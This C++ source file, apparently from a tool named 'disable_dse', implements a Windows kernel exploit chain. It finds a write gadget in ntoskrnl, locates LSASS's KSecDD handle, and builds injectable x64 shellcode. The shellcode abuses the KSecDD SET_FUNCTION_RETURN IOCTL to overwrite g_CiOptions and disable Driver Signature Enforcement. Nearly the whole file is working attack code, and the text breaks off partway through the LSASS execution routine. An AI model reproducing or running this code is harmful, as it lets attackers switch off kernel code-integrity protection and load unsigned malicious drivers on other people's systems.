// KsecDdExecutor.cpp
// 说明见 KsecDdExecutor.h。
// 本文件实现：
// 1) ntoskrnl 写 gadget 定位（SEC_IMAGE 映射 + 字节模式扫描）；
// 2) LSASS KSecDD 句柄查找（SystemHandleInformation 枚举 + 对象名比对）；
// 3) LSASS 远程注入路径（shellcode 注入 → NtDeviceIoControlFile → 回收结果）。
//
// 基于 KSecDD SET_FUNCTION_RETURN IOCTL 的公开行为实现。

#include "KsecDdExecutor.h"
#include "../../../../shared/driver/KsecDdProtocol.h"

#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>

#include <algorithm>
#include <array>
#include <cstring>
#include <vector>

namespace
{
    // kSystemModuleInformationClass：
    // - SystemModuleInformation 的类号，枚举内核模块拿 ntoskrnl 基址。
    constexpr unsigned long kSystemModuleInformationClass = 11UL;

    // kSystemHandleInformationClass：
    // - SystemHandleInformation 的类号，枚举系统句柄拿 LSASS 的 KSecDD 句柄。
    constexpr unsigned long kSystemHandleInformationClass = 16UL;

    // kStatusInfoLengthMismatch：
    // - STATUS_INFO_LENGTH_MISMATCH，缓冲区不够时返回，需要扩容重试。
    constexpr long kStatusInfoLengthMismatch = static_cast<long>(0xC0000004L);

    // proto：KSecDD 协议常量与结构的命名空间别名，唯一定义在 KsecDdProtocol.h。
    namespace proto = ks::misc::disable_dse::ksec_protocol;

    // NtQuerySystemInformationFn：
    // - NtQuerySystemInformation 调用约定签名。
    using NtQuerySystemInformationFn = long(NTAPI*)(
        unsigned long systemInformationClass,
        void* systemInformation,
        unsigned long systemInformationLength,
        unsigned long* returnLength);

    // NtQueryObjectFn：
    // - NtQueryObject 调用约定签名，用于查询对象名称。
    using NtQueryObjectFn = long(NTAPI*)(
        HANDLE objectHandle,
        unsigned long objectInformationClass,
        void* objectInformation,
        unsigned long objectInformationLength,
        unsigned long* returnLength);

    // NtDeviceIoControlFileFn：
    // - NtDeviceIoControlFile 调用约定签名。
    using NtDeviceIoControlFileFn = long(NTAPI*)(
        HANDLE fileHandle,
        HANDLE event,
        void* apcRoutine,
        void* apcContext,
        IO_STATUS_BLOCK* ioStatusBlock,
        unsigned long ioControlCode,
        void* inputBuffer,
        unsigned long inputBufferLength,
        void* outputBuffer,
        unsigned long outputBufferLength);

    // KernelModuleRow / KernelModuleList：
    // - RTL_PROCESS_MODULE_INFORMATION 本地定义，与 DisableDseBackend.cpp 中结构一致。
    struct KernelModuleRow
    {
        void* section;
        void* mappedBase;
        void* imageBase;
        unsigned long imageSize;
        unsigned long flags;
        unsigned short loadOrderIndex;
        unsigned short initOrderIndex;
        unsigned short loadCount;
        unsigned short fileNameOffset;
        unsigned char fullPathName[256];
    };

    struct KernelModuleList
    {
        unsigned long count;
        KernelModuleRow rows[1];
    };

    // RtlAdjustPrivilegeFn：
    // - RtlAdjustPrivilege 签名，用于在不直接调用 AdjustTokenPrivileges 的场景。
    using RtlAdjustPrivilegeFn = long(NTAPI*)(
        unsigned long privilege,
        unsigned char enable,
        unsigned char client,
        unsigned char* wasEnabled);

    // enableSeDebugPrivilege：
    // - 作用：在当前进程令牌中启用 SeDebugPrivilege（编号 20）。
    // - 返回：NTSTATUS，0 表示成功。
    long enableSeDebugPrivilege()
    {
        const HMODULE ntdll = ::GetModuleHandleW(L"ntdll.dll");
        if (ntdll == nullptr)
        {
            return static_cast<long>(0xC0000135L);
        }
        const auto adjustFn = reinterpret_cast<RtlAdjustPrivilegeFn>(
            ::GetProcAddress(ntdll, "RtlAdjustPrivilege"));
        if (adjustFn == nullptr)
        {
            return static_cast<long>(0xC0000135L);
        }
        // kSeDebugPrivilege = 20。
        unsigned char wasEnabled = 0;
        return adjustFn(20, 1, 0, &wasEnabled);
    }

    // resolveNtQuerySystemInformation：
    // - 作用：从 ntdll 获取 NtQuerySystemInformation 的函数指针。
    NtQuerySystemInformationFn resolveNtQuerySystemInformation()
    {
        const HMODULE ntdll = ::GetModuleHandleW(L"ntdll.dll");
        if (ntdll == nullptr)
        {
            return nullptr;
        }
        return reinterpret_cast<NtQuerySystemInformationFn>(
            ::GetProcAddress(ntdll, "NtQuerySystemInformation"));
    }

    // resolveNtQueryObject：
    // - 作用：从 ntdll 获取 NtQueryObject 的函数指针。
    NtQueryObjectFn resolveNtQueryObject()
    {
        const HMODULE ntdll = ::GetModuleHandleW(L"ntdll.dll");
        if (ntdll == nullptr)
        {
            return nullptr;
        }
        return reinterpret_cast<NtQueryObjectFn>(
            ::GetProcAddress(ntdll, "NtQueryObject"));
    }

    // resolveNtDeviceIoControlFile：
    // - 作用：从 ntdll 获取 NtDeviceIoControlFile 的函数指针。
    NtDeviceIoControlFileFn resolveNtDeviceIoControlFile()
    {
        const HMODULE ntdll = ::GetModuleHandleW(L"ntdll.dll");
        if (ntdll == nullptr)
        {
            return nullptr;
        }
        return reinterpret_cast<NtDeviceIoControlFileFn>(
            ::GetProcAddress(ntdll, "NtDeviceIoControlFile"));
    }

    // ntHeadersOf：
    // - 输入 base：SEC_IMAGE 映射基址；
    // - 作用：校验 DOS/NT 签名并返回 64 位 NT 头。
    const IMAGE_NT_HEADERS64* ntHeadersOf(const unsigned char* const base)
    {
        if (base == nullptr)
        {
            return nullptr;
        }
        const auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        {
            return nullptr;
        }
        const auto* nt =
            reinterpret_cast<const IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE
            || nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        {
            return nullptr;
        }
        return nt;
    }

    // ImageMapping：
    // - RAII 封装，把一个 PE 文件按 SEC_IMAGE 只读映射，析构自动释放。
    class ImageMapping final
    {
    public:
        ImageMapping() = default;

        ~ImageMapping()
        {
            if (m_base != nullptr)
            {
                ::UnmapViewOfFile(m_base);
            }
            if (m_mapping != nullptr)
            {
                ::CloseHandle(m_mapping);
            }
            if (m_file != INVALID_HANDLE_VALUE)
            {
                ::CloseHandle(m_file);
            }
        }

        ImageMapping(const ImageMapping&) = delete;
        ImageMapping& operator=(const ImageMapping&) = delete;

        // open：
        // - 输入 path：PE 文件完整路径；
        // - 作用：以 SEC_IMAGE 建立只读节视图，节按 RVA 布局；
        // - 返回：true 表示映射成功。
        bool open(const std::wstring& path)
        {
            m_file = ::CreateFileW(
                path.c_str(),
                GENERIC_READ,
                FILE_SHARE_READ,
                nullptr,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                nullptr);
            if (m_file == INVALID_HANDLE_VALUE)
            {
                m_lastError = ::GetLastError();
                return false;
            }

            // SEC_IMAGE_NO_EXECUTE：按节 RVA 布局映射但不设可执行权限。
            m_mapping = ::CreateFileMappingW(
                m_file,
                nullptr,
                PAGE_READONLY | SEC_IMAGE_NO_EXECUTE,
                0, 0,
                nullptr);
            if (m_mapping == nullptr)
            {
                m_lastError = ::GetLastError();
                return false;
            }

            m_base = static_cast<const unsigned char*>(
                ::MapViewOfFile(m_mapping, FILE_MAP_READ, 0, 0, 0));
            if (m_base == nullptr)
            {
                m_lastError = ::GetLastError();
                return false;
            }
            return true;
        }

        // base：映射基址。
        const unsigned char* base() const { return m_base; }
        // lastError：最近一次 Win32 错误码。
        DWORD lastError() const { return m_lastError; }

    private:
        HANDLE m_file = INVALID_HANDLE_VALUE;   // m_file：PE 文件句柄。
        HANDLE m_mapping = nullptr;             // m_mapping：节映射对象。
        const unsigned char* m_base = nullptr;  // m_base：映射视图基址。
        DWORD m_lastError = 0;                  // m_lastError：最近错误码。
    };

    // systemNtoskrnlPath：
    // - 作用：构造 ntoskrnl.exe 的完整磁盘路径。
    std::wstring systemNtoskrnlPath()
    {
        wchar_t systemDir[MAX_PATH] = {};
        if (::GetSystemDirectoryW(systemDir, MAX_PATH) == 0U)
        {
            return {};
        }
        return std::wstring(systemDir) + L"\\ntoskrnl.exe";
    }

    // isRexPrefix：
    // - 判断一个字节是否为 x64 REX 前缀（0x40-0x4F）。
    // - 如果 gadget 前一个字节是 REX，说明 89 11 是更长指令的一部分，
    //   不是独立的 `mov [rcx], edx`。
    bool isRexPrefix(const unsigned char byte)
    {
        return byte >= 0x40 && byte <= 0x4F;
    }

    // findWriteGadgetRva：
    // - 输入 base：ntoskrnl SEC_IMAGE 映射基址；trace：诊断输出；
    // - 作用：在可执行节中搜索 `mov [rcx], edx; ret` 字节序列，
    //   并验证指令边界（前一字节不能是 REX 前缀）和唯一性（必须恰好一个命中）；
    // - 返回：gadget RVA，未找到或多个命中返回 0。
    std::uint32_t findWriteGadgetRva(
        const unsigned char* const base,
        QStringList& trace)
    {
        const IMAGE_NT_HEADERS64* const nt = ntHeadersOf(base);
        if (nt == nullptr)
        {
            trace.append(QStringLiteral("ntoskrnl 不是有效的 64 位 PE 映像。"));
            return 0U;
        }

        // 收集所有通过指令边界检查的命中。
        struct GadgetHit
        {
            std::uint32_t rva;
            char sectionName[9];
            std::size_t sectionOffset;
        };
        std::vector<GadgetHit> hits;

        // 遍历每个可执行节，在其中搜索 gadget 字节模式。
        const IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt);
        for (WORD index = 0; index < nt->FileHeader.NumberOfSections;
             ++index, ++section)
        {
            // 只在可执行节中搜索（通常是 .text 或 PAGE）。
            if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == 0)
            {
                continue;
            }

            const DWORD virtualSize = section->Misc.VirtualSize != 0U
                ? section->Misc.VirtualSize
                : section->SizeOfRawData;
            if (virtualSize < proto::kWriteGadgetPatternSize)
            {
                continue;
            }

            // 在节范围内逐字节搜索三字节模式。
            const unsigned char* const sectionStart =
                base + section->VirtualAddress;
            const std::size_t searchLimit =
                virtualSize - proto::kWriteGadgetPatternSize;
            for (std::size_t offset = 0; offset <= searchLimit; ++offset)
            {
                if (std::memcmp(sectionStart + offset,
                                proto::kWriteGadgetPattern,
                                proto::kWriteGadgetPatternSize) != 0)
                {
                    continue;
                }

                // 指令边界检查：前一字节若为 REX 前缀，
                // 则 89 11 C3 是更长指令的操作码部分而非独立指令。
                if (offset > 0 && isRexPrefix(sectionStart[offset - 1]))
                {
                    continue;
                }

                GadgetHit hit{};
                hit.rva = section->VirtualAddress
                    + static_cast<std::uint32_t>(offset);
                hit.sectionOffset = offset;
                std::memcpy(hit.sectionName, section->Name, 8);
                hit.sectionName[8] = '\0';
                hits.push_back(hit);
            }
        }

        // 报告所有命中。
        for (const auto& hit : hits)
        {
            trace.append(
                QStringLiteral("命中 gadget：节 %1 + 0x%2，RVA = 0x%3")
                    .arg(QString::fromLatin1(hit.sectionName))
                    .arg(hit.sectionOffset, 0, 16)
                    .arg(hit.rva, 0, 16));
        }

        if (hits.empty())
        {
            trace.append(
                QStringLiteral("未在 ntoskrnl 的可执行节中找到写 gadget。"));
            return 0U;
        }

        // 优先选 .text 节命中（.text 在整个内核生命周期内常驻，
        // INIT/INITKDBG 等节可能在初始化后被丢弃）。
        std::size_t chosen = 0;
        for (std::size_t i = 0; i < hits.size(); ++i)
        {
            if (std::strncmp(hits[i].sectionName, ".text", 5) == 0)
            {
                chosen = i;
                break;
            }
        }

        trace.append(
            QStringLiteral("共 %1 个命中，选用 RVA=0x%2（节 %3）")
                .arg(hits.size())
                .arg(hits[chosen].rva, 0, 16)
                .arg(QString::fromLatin1(hits[chosen].sectionName)));
        return hits[chosen].rva;
    }

    // findKernelModuleBase：
    // - 输入 moduleName：要查找的内核模块名（不区分大小写）；
    //        baseOut：输出内核基址；imageSizeOut：输出模块映像大小；
    //        trace：诊断输出；
    // - 作用：通过 NtQuerySystemInformation(SystemModuleInformation) 枚举内核模块；
    // - 返回：true 表示找到。
    bool findKernelModuleBase(
        const char* const moduleName,
        std::uint64_t& baseOut,
        unsigned long& imageSizeOut,
        QStringList& trace)
    {
        const auto queryFn = resolveNtQuerySystemInformation();
        if (queryFn == nullptr)
        {
            trace.append(QStringLiteral("无法获取 NtQuerySystemInformation 入口。"));
            return false;
        }

        // 先取所需缓冲区大小，再分配并重试。
        unsigned long needed = 0;
        queryFn(kSystemModuleInformationClass, nullptr, 0, &needed);
        if (needed == 0)
        {
            needed = 1024U * 256U;
        }
        std::vector<unsigned char> buffer(needed + 4096U);
        const long status = queryFn(
            kSystemModuleInformationClass,
            buffer.data(),
            static_cast<unsigned long>(buffer.size()),
            &needed);
        if (status < 0)
        {
            trace.append(
                QStringLiteral("SystemModuleInformation 查询失败，NTSTATUS=0x%1。")
                    .arg(static_cast<unsigned long>(status), 8, 16, QChar('0')));
            return false;
        }

        // 遍历内核模块列表，按文件名匹配。
        const auto* list = reinterpret_cast<const KernelModuleList*>(buffer.data());
        for (unsigned long index = 0; index < list->count; ++index)
        {
            const auto& row = list->rows[index];
            const char* const fileName =
                reinterpret_cast<const char*>(row.fullPathName + row.fileNameOffset);
            if (_stricmp(fileName, moduleName) == 0)
            {
                baseOut = reinterpret_cast<std::uint64_t>(row.imageBase);
                imageSizeOut = row.imageSize;
                trace.append(
                    QStringLiteral("内核模块 %1 基址 = 0x%2，大小 = 0x%3")
                        .arg(QString::fromLatin1(fileName))
                        .arg(baseOut, 16, 16, QChar('0'))
                        .arg(imageSizeOut, 8, 16, QChar('0')));
                return true;
            }
        }

        trace.append(
            QStringLiteral("未在内核模块列表中找到 %1。")
                .arg(QString::fromLatin1(moduleName)));
        return false;
    }

    // findLsassPid：
    // - 作用：通过进程快照查找 lsass.exe 的 PID。
    // - 返回：PID，未找到返回 0。
    DWORD findLsassPid(QStringList& trace)
    {
        const HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE)
        {
            trace.append(QStringLiteral("CreateToolhelp32Snapshot 失败。"));
            return 0;
        }

        PROCESSENTRY32W entry{};
        entry.dwSize = sizeof(entry);
        DWORD lsassPid = 0;

        // 遍历进程快照，按名称不区分大小写匹配 lsass.exe。
        if (::Process32FirstW(snapshot, &entry) != FALSE)
        {
            do
            {
                if (_wcsicmp(entry.szExeFile, L"lsass.exe") == 0)
                {
                    lsassPid = entry.th32ProcessID;
                    break;
                }
            } while (::Process32NextW(snapshot, &entry) != FALSE);
        }
        ::CloseHandle(snapshot);

        if (lsassPid == 0)
        {
            trace.append(QStringLiteral("未在进程快照中找到 lsass.exe。"));
        }
        else
        {
            trace.append(
                QStringLiteral("lsass.exe PID = %1").arg(lsassPid));
        }
        return lsassPid;
    }

    // findLsassKsecDdHandle：
    // - 输入 lsassPid：LSASS 的 PID；trace：诊断输出；
    // - 作用：枚举系统句柄，找到 LSASS 持有的 \Device\KsecDD 句柄值；
    // - 方法：先用 SystemHandleInformation 拿全量句柄，按 PID 过滤，
    //   再逐一 DuplicateHandle + NtQueryObject(ObjectNameInformation) 比对设备名；
    // - 返回：句柄值（LSASS 进程内的值），未找到返回 0。
    //
    // 结构体使用 proto::SystemHandleEntry（processId 为 ULONG），
    // 与 Windows 实际句柄表布局一致。
    unsigned short findLsassKsecDdHandle(
        const DWORD lsassPid,
        QStringList& trace)
    {
        const auto queryFn = resolveNtQuerySystemInformation();
        const auto queryObjFn = resolveNtQueryObject();
        if (queryFn == nullptr || queryObjFn == nullptr)
        {
            trace.append(QStringLiteral("无法获取 NtQuerySystemInformation 或 NtQueryObject 入口。"));
            return 0;
        }

        // 打开 LSASS 进程用于 DuplicateHandle。
        const HANDLE lsassProcess = ::OpenProcess(
            PROCESS_DUP_HANDLE, FALSE, lsassPid);
        if (lsassProcess == nullptr)
        {
            trace.append(
                QStringLiteral("无法打开 LSASS 进程（PID %1），Win32 错误 %2。可能 LSASS 以 PPL 运行。")
                    .arg(lsassPid)
                    .arg(::GetLastError()));
            return 0;
        }

        // 枚举系统句柄：循环扩容直到成功。
        std::vector<unsigned char> buffer(1024U * 1024U);
        unsigned long needed = 0;
        long status = kStatusInfoLengthMismatch;
        while (status == kStatusInfoLengthMismatch)
        {
            status = queryFn(
                kSystemHandleInformationClass,
                buffer.data(),
                static_cast<unsigned long>(buffer.size()),
                &needed);
            if (status == kStatusInfoLengthMismatch)
            {
                buffer.resize(buffer.size() * 2);
            }
        }
        if (status < 0)
        {
            ::CloseHandle(lsassProcess);
            trace.append(
                QStringLiteral("SystemHandleInformation 查询失败，NTSTATUS=0x%1。")
                    .arg(static_cast<unsigned long>(status), 8, 16, QChar('0')));
            return 0;
        }

        // 使用协议头中正确的句柄表结构（processId 为 ULONG）。
        const auto* header =
            reinterpret_cast<const proto::SystemHandleInformation*>(buffer.data());
        unsigned short foundHandle = 0;
        int candidateCount = 0;

        // 遍历句柄列表，只看 LSASS 持有的句柄。
        for (unsigned long index = 0; index < header->handleCount; ++index)
        {
            const auto& entry = header->handles[index];
            // PID 直接以 ULONG 比较，不截断到 USHORT。
            if (entry.processId != static_cast<unsigned long>(lsassPid))
            {
                continue;
            }

            // 把 LSASS 的句柄复制到本进程以查询对象名。
            HANDLE duplicated = nullptr;
            if (::DuplicateHandle(
                    lsassProcess,
                    reinterpret_cast<HANDLE>(static_cast<std::uintptr_t>(entry.handleValue)),
                    ::GetCurrentProcess(),
                    &duplicated,
                    0,
                    FALSE,
                    DUPLICATE_SAME_ACCESS) == FALSE)
            {
                continue;
            }

            ++candidateCount;

            // 查询对象名称，ObjectNameInformation = 1。
            unsigned char nameBuffer[1024] = {};
            unsigned long nameLen = 0;
            const long queryObjStatus = queryObjFn(
                duplicated,
                1,
                nameBuffer,
                sizeof(nameBuffer),
                &nameLen);
            ::CloseHandle(duplicated);

            if (queryObjStatus < 0)
            {
                continue;
            }

            // UNICODE_STRING 在缓冲区开头。
            const auto* nameInfo = reinterpret_cast<const UNICODE_STRING*>(nameBuffer);
            if (nameInfo->Length == 0 || nameInfo->Buffer == nullptr)
            {
                continue;
            }

            // 比对设备路径，使用协议头中的设备名常量。
            const std::wstring objectName(nameInfo->Buffer, nameInfo->Length / sizeof(wchar_t));
            if (_wcsicmp(objectName.c_str(), proto::kKsecDdDeviceName) == 0)
            {
                foundHandle = entry.handleValue;
                trace.append(
                    QStringLiteral("在 LSASS 中找到 KSecDD 句柄 = 0x%1")
                        .arg(foundHandle, 4, 16, QChar('0')));
                break;
            }
        }

        ::CloseHandle(lsassProcess);

        if (foundHandle == 0)
        {
            trace.append(
                QStringLiteral("LSASS 中未找到 \\Device\\KsecDD 句柄（已检查 %1 个候选）。")
                    .arg(candidateCount));
        }
        return foundHandle;
    }

    // buildLsassShellcode：
    // - 输入 ksecHandle：LSASS 进程内的 KSecDD 句柄值；
    //        ntDeviceIoControlFileAddr：ntdll!NtDeviceIoControlFile 的地址；
    //        gadgetAddress：写 gadget 的内核地址；
    //        targetAddress：g_CiOptions 的内核地址；
    //        value：要写入 g_CiOptions 的值；
    // - 作用：构建在 LSASS 中执行的 x64 shellcode，该 shellcode 调用
    //   NtDeviceIoControlFile 发送 IOCTL_KSEC_IPC_SET_FUNCTION_RETURN；
    // - 返回：完整的 shellcode + 数据块字节序列。
    //
    // ===== KSecDD SET_FUNCTION_RETURN ABI =====
    //
    // IOCTL 输入为 16 字节 SetFunctionReturnReq：
    //   [0..8)   = FunctionReturn 指针（指向下方 FunctionReturn 结构）
    //   [8..12)  = Value（EDX 值），[12..16) 置零
    //
    // FunctionReturn 结构为 16 字节：
    //   [0..8)   = Function（写 gadget 内核地址 → RAX）
    //   [8..16)  = Argument（目标地址 → RCX）
    //
    // KSecDD 内核端行为：
    //   1) 读 IOCTL 输入偏移 0 取得 FunctionReturn 用户态指针；
    //   2) 解引用该指针取 Function 和 Argument；
    //   3) 读 IOCTL 输入偏移 8 取 Value（加载到 EDX）；
    //   4) CALL Function(Argument, Value)。
    //
    // 数据块布局（紧跟 shellcode，相对数据基址的偏移）：
    //   [0x00 .. 0x08)  = KSecDD 句柄（HANDLE，8 字节）
    //   [0x08 .. 0x10)  = NtDeviceIoControlFile 函数指针
    //   [0x10 .. 0x18)  = FunctionReturn.function（gadget 地址）
    //   [0x18 .. 0x20)  = FunctionReturn.argument（目标地址）
    //   [0x20 .. 0x28)  = SetFunctionReturnReq.functionReturn（运行时 patch）
    //   [0x28 .. 0x30)  = SetFunctionReturnReq.value（uint64 零扩展）
    //   [0x30 .. 0x34)  = NTSTATUS 结果
    //   [0x34 .. 0x38)  = 对齐填充
    //   [0x38 .. 0x48)  = IO_STATUS_BLOCK（16 字节）
    std::vector<unsigned char> buildLsassShellcode(
        const unsigned short ksecHandle,
        const std::uint64_t ntDeviceIoControlFileAddr,
        const std::uint64_t gadgetAddress,
        const std::uint64_t targetAddress,
        const std::uint32_t value)
    {
        // shellcode 步骤（线程参数 RCX = 分配块起始地址）：
        //   push rbx                         ; 保存非易失寄存器
        //   lea rbx, [rcx + codeSize]        ; rbx = 数据块基址
        //   sub rsp, 0x50                    ; 分配栈空间（80 字节，push 后对齐到 16）
        //   lea rax, [rbx + 0x10]            ; rax = &FunctionReturn
        //   mov [rbx + 0x20], rax            ; patch SetFunctionReturnReq.functionReturn
        //   mov rcx, [rbx]                   ; rcx = KSecDD 句柄（参数 1）
        //   xor edx, edx                     ; rdx = Event = NULL（参数 2）
        //   xor r8d, r8d                     ; r8  = ApcRoutine = NULL（参数 3）
        //   xor r9d, r9d                     ; r9  = ApcContext = NULL（参数 4）
        //   lea rax, [rbx + 0x38]            ; rax = &IO_STATUS_BLOCK
        //   mov [rsp+0x20], rax              ; 参数 5 = IoStatusBlock
        //   mov dword [rsp+0x28], 0x39006F   ; 参数 6 = IOCTL_KSEC_IPC_SET_FUNCTION_RETURN
        //   lea rax, [rbx + 0x20]            ; rax = &SetFunctionReturnReq
        //   mov [rsp+0x30], rax              ; 参数 7 = InputBuffer
        //   mov dword [rsp+0x38], 16         ; 参数 8 = InputBufferLength = 16
        //   mov qword [rsp+0x40], 0          ; 参数 9 = OutputBuffer = NULL
        //   mov dword [rsp+0x48], 0          ; 参数 10 = OutputBufferLength = 0
        //   call [rbx + 0x08]                ; call NtDeviceIoControlFile
        //   mov [rbx + 0x30], eax            ; 保存 NTSTATUS 结果
        //   add rsp, 0x50
        //   pop rbx
        //   xor eax, eax                     ; 线程返回 0
        //   ret

        static const unsigned char code[] = {
            0x53,                                                       // [0]      push rbx
            0x48, 0x8D, 0x99, 0x00, 0x00, 0x00, 0x00,                  // [1..7]   lea rbx, [rcx + imm32] (patch)
            0x48, 0x83, 0xEC, 0x50,                                     // [8..11]  sub rsp, 0x50
            0x48, 0x8D, 0x43, 0x10,                                     // [12..15] lea rax, [rbx + 0x10]
            0x48, 0x89, 0x43, 0x20,                                     // [16..19] mov [rbx + 0x20], rax
            0x48, 0x8B, 0x0B,                                           // [20..22] mov rcx, [rbx]
            0x31, 0xD2,                                                 // [23..24] xor edx, edx
            0x45, 0x31, 0xC0,                                           // [25..27] xor r8d, r8d
            0x45, 0x31, 0xC9,                                           // [28..30] xor r9d, r9d
            0x48, 0x8D, 0x43, 0x38,                                     // [31..34] lea rax, [rbx + 0x38]
            0x48, 0x89, 0x44, 0x24, 0x20,                               // [35..39] mov [rsp+0x20], rax
            0xC7, 0x44, 0x24, 0x28, 0x6F, 0x00, 0x39, 0x00,            // [40..47] mov dword [rsp+0x28], 0x0039006F
            0x48, 0x8D, 0x43, 0x20,                                     // [48..51] lea rax, [rbx + 0x20]
            0x48, 0x89, 0x44, 0x24, 0x30,                               // [52..56] mov [rsp+0x30], rax
            0xC7, 0x44, 0x24, 0x38, 0x10, 0x00, 0x00, 0x00,            // [57..64] mov dword [rsp+0x38], 16
            0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00,      // [65..73] mov qword [rsp+0x40], 0
            0xC7, 0x44, 0x24, 0x48, 0x00, 0x00, 0x00, 0x00,            // [74..81] mov dword [rsp+0x48], 0
            0xFF, 0x53, 0x08,                                           // [82..84] call [rbx + 0x08]
            0x89, 0x43, 0x30,                                           // [85..87] mov [rbx + 0x30], eax
            0x48, 0x83, 0xC4, 0x50,                                     // [88..91] add rsp, 0x50
            0x5B,                                                       // [92]     pop rbx
            0x31, 0xC0,                                                 // [93..94] xor eax, eax
            0xC3                                                        // [95]     ret
        };

        // 代码总长 96 字节（已按 8 字节对齐）。
        constexpr std::size_t kCodeSize = 96;
        // 数据块布局（相对 kCodeSize 的偏移）：
        constexpr std::size_t kOffHandle     = 0x00;  // [0x00..0x08) KSecDD 句柄
        constexpr std::size_t kOffIoCtlFn    = 0x08;  // [0x08..0x10) NtDeviceIoControlFile 指针
        constexpr std::size_t kOffFuncRet    = 0x10;  // [0x10..0x20) FunctionReturn {function, argument}
        constexpr std::size_t kOffIoctlInput = 0x20;  // [0x20..0x30) SetFunctionReturnReq {ptr, value}
        constexpr std::size_t kOffResult     = 0x30;  // [0x30..0x34) NTSTATUS 结果
        constexpr std::size_t kOffIosb       = 0x38;  // [0x38..0x48) IO_STATUS_BLOCK
        constexpr std::size_t kDataSize      = 0x48;  // 数据块总长 72 字节
        constexpr std::size_t kTotalSize     = kCodeSize + kDataSize;

        std::vector<unsigned char> blob(kTotalSize, 0);

        // 写入代码段。
        std::memcpy(blob.data(), code, sizeof(code));
        // patch: lea rbx, [rcx + codeSize] 的 imm32 偏移（字节 4-7）。
        const std::uint32_t codeSizeU32 = static_cast<std::uint32_t>(kCodeSize);
        std::memcpy(blob.data() + 4, &codeSizeU32, 4);

        // 写入数据块。
        unsigned char* const data = blob.data() + kCodeSize;

        // 句柄值零扩展为 8 字节。
        const std::uint64_t handleU64 = static_cast<std::uint64_t>(ksecHandle);
        std::memcpy(data + kOffHandle, &handleU64, 8);

        // NtDeviceIoControlFile 函数指针。
        std::memcpy(data + kOffIoCtlFn, &ntDeviceIoControlFileAddr, 8);

        // FunctionReturn 结构：{function, argument}。
        std::memcpy(data + kOffFuncRet, &gadgetAddress, 8);
        std::memcpy(data + kOffFuncRet + 8, &targetAddress, 8);

        // SetFunctionReturnReq：
        //   [0..8)  functionReturn 指针（shellcode 运行时 patch，这里留零）
        //   [8..16) value（低 32 位有效，高 32 位置零）
        const std::uint64_t valueU64 = static_cast<std::uint64_t>(value);
        std::memcpy(data + kOffIoctlInput + 8, &valueU64, 8);

        // NTSTATUS 结果和 IO_STATUS_BLOCK 初始化为 0（vector 构造已完成）。

        return blob;
    }
}

namespace ks::misc::disable_dse
{
    GadgetLocation locateWriteGadget()
    {
        GadgetLocation result;

        // 第一步：映射磁盘上的 ntoskrnl.exe。
        const std::wstring path = systemNtoskrnlPath();
        if (path.empty())
        {
            result.failureText = QStringLiteral("无法取得系统目录路径。");
            return result;
        }
        result.traceLines.append(
            QStringLiteral("映射镜像：%1").arg(QString::fromStdWString(path)));

        ImageMapping mapping;
        if (!mapping.open(path))
        {
            result.failureText =
                QStringLiteral("映射 ntoskrnl.exe 失败，Win32 错误=%1。")
                    .arg(mapping.lastError());
            return result;
        }

        const IMAGE_NT_HEADERS64* const diskNt = ntHeadersOf(mapping.base());
        if (diskNt == nullptr)
        {
            result.failureText = QStringLiteral("ntoskrnl.exe 不是有效的 64 位 PE 映像。");
            return result;
        }

        // 第二步：取得 ntoskrnl 在内核中的加载基址和 SizeOfImage。
        std::uint64_t ntoskrnlBase = 0;
        unsigned long loadedImageSize = 0;
        if (!findKernelModuleBase("ntoskrnl.exe", ntoskrnlBase,
                                  loadedImageSize, result.traceLines))
        {
            result.failureText = QStringLiteral("未能取得内核中 ntoskrnl 的基址。");
            return result;
        }

        // 第三步：身份校验——确认磁盘映像与内核加载的是同一份二进制。
        // SizeOfImage 不一致说明磁盘文件已被更新（补丁），gadget RVA 不可信。
        const unsigned long diskSizeOfImage =
            diskNt->OptionalHeader.SizeOfImage;
        if (diskSizeOfImage != loadedImageSize)
        {
            result.traceLines.append(
                QStringLiteral("磁盘 SizeOfImage=0x%1，内核 SizeOfImage=0x%2")
                    .arg(diskSizeOfImage, 8, 16, QChar('0'))
                    .arg(loadedImageSize, 8, 16, QChar('0')));
            result.failureText = QStringLiteral(
                "磁盘 ntoskrnl.exe 与内核中加载的版本不匹配，可能系统已安装补丁但未重启。");
            return result;
        }
        result.traceLines.append(
            QStringLiteral("身份校验通过，SizeOfImage=0x%1，TimeDateStamp=0x%2")
                .arg(diskSizeOfImage, 8, 16, QChar('0'))
                .arg(diskNt->FileHeader.TimeDateStamp, 8, 16, QChar('0')));

        // 第四步：在可执行节中搜索写 gadget。
        const std::uint32_t rva =
            findWriteGadgetRva(mapping.base(), result.traceLines);
        if (rva == 0U)
        {
            result.failureText = QStringLiteral(
                "未在 ntoskrnl 中找到 mov [rcx], edx; ret 字节序列。");
            return result;
        }

        // 填写定位结果。
        result.ok = true;
        result.ntoskrnlBase = ntoskrnlBase;
        result.rva = rva;
        result.kernelAddress = ntoskrnlBase + rva;
        result.traceLines.append(
            QStringLiteral("写 gadget 内核地址 = 0x%1")
                .arg(result.kernelAddress, 16, 16, QChar('0')));
        return result;
    }

    ExecuteResult executeViaLsass(
        const std::uint64_t gadgetAddress,
        const std::uint64_t targetAddress,
        const std::uint32_t value)
    {
        ExecuteResult result;

        // 第零步：启用 SeDebugPrivilege。
        // LSASS 受保护进程轻量级（PPL）之外的场景仍需要 SeDebugPrivilege
        // 才能用 PROCESS_DUP_HANDLE / PROCESS_VM_WRITE 打开 LSASS。
        // 提升权限失败不直接报错——后续 OpenProcess 可能本身已有权限。
        const long debugPrivStatus = enableSeDebugPrivilege();
        if (debugPrivStatus == 0)
        {
            result.traceLines.append(QStringLiteral("SeDebugPrivilege 已启用。"));
        }
        else
        {
            result.traceLines.append(
                QStringLiteral("SeDebugPrivilege 启用失败，NTSTATUS=0x%1（继续尝试）。")
